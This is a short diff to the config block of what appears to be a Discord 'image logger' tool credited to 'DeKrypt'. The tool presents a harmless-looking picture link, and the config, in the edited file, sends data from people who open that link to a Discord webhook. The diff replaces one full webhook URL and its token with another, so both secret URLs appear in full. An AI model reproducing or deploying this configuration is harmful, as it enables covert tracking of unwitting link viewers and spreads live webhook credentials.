@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1197521514082349087/mddy57bPnLiQjPwcwyGhnLAO--dfQ2cFGPyY5dJK9-__Ty41XpDfigzR4hpfwCysEHAO",
+    "webhook": "https://discord.com/api/webhooks/1223387195205882037/naFg4so5jcX9gqDrfznJulF-ZkQ8laRPsh6l05HcNlm9bEzMbz4c93NmiI8SGgz4IjC9",
     "image": "https://media.npr.org/assets/img/2017/09/12/macaca_nigra_self-portrait-3e0070aa19a7fe36e802253048411a38f14a79f8.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
